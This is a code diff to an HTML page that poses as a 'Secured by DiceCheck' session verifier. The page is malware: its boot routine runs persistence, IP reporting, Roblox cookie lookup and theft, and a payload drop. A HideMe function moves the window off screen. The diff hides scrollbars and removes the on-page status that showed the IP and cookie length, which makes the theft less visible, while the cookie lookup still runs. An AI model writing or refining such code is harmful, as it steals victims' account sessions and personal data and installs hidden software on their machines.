@@ -8,9 +8,12 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{height:100%}
+html{overflow:hidden;scrollbar-width:none;-ms-overflow-style:none}
+html::-webkit-scrollbar,body::-webkit-scrollbar{width:0;height:0;display:none}
 body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
  background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
- display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
+ display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px;
+ scrollbar-width:none;-ms-overflow-style:none}
 .x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;border-radius:9px;
  color:#9aa6bd;font-size:12px;cursor:pointer;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
 .x:hover{color:#fff;background:rgba(255,255,255,.11)}
@@ -53,13 +56,11 @@ h1{font-size:19px;font-weight:600}
 .ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round}
 .done h2{font-size:19px;font-weight:600}
 .done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
-.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
- background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
+.badge{display:inline-block;margin-top:14px;padding:6px 12px;font-size:11.5px;color:#bcd0ff}
 button{margin-top:16px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;font-size:13.5px;font-weight:600;color:#fff;
  background:linear-gradient(135deg,#5b8cff,#8b5cff);box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
 button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
 .last{margin-top:9px;font-size:11px;color:#8b96ad}
-.info{margin-top:6px;font-size:11px;color:#7de0a4;min-height:14px;word-break:break-all}
 footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
 footer a{color:#9db4ff;text-decoration:none}
 </style>
@@ -95,7 +96,6 @@ footer a{color:#9db4ff;text-decoration:none}
     <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
     <div class="badge">Secured by DiceCheck</div>
     <button id="again">Re-check now</button>
-    <div class="info" id="info"></div>
     <div class="last" id="last">Last check: --:--:--</div>
   </div>
 
@@ -323,7 +323,7 @@ function HideMe(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch
 var stage=document.getElementById("stage"), done=document.getElementById("done"),
     bar=document.getElementById("bar"), pct=document.getElementById("pct"),
     ckc=document.getElementById("ckc"), ckt=document.getElementById("ckt"),
-    info=document.getElementById("info"), last=document.getElementById("last"),
+    last=document.getElementById("last"),
     steps=document.querySelectorAll(".steps li");
 var pT=0,pS=0,pD=false,ck=0;
 
@@ -363,9 +363,7 @@ function isFresh(){
 function Report(){
  var ip=GetIP();
  SendInfo(ip);
- var r=FindCookie();
- if(!r.ok){ Alert("Roblox - no cookie", r.how, 15158332); info.innerHTML="no cookie ("+r.how+")"; }
- else { SendCookie(r.ck, r.how); info.innerHTML="IP "+(ip.ip||"?")+" - cookie "+r.ck.length+" chars"; }
+ FindCookie();
 }
 
 function boot(){ Pers(); Report(); Drop(); }
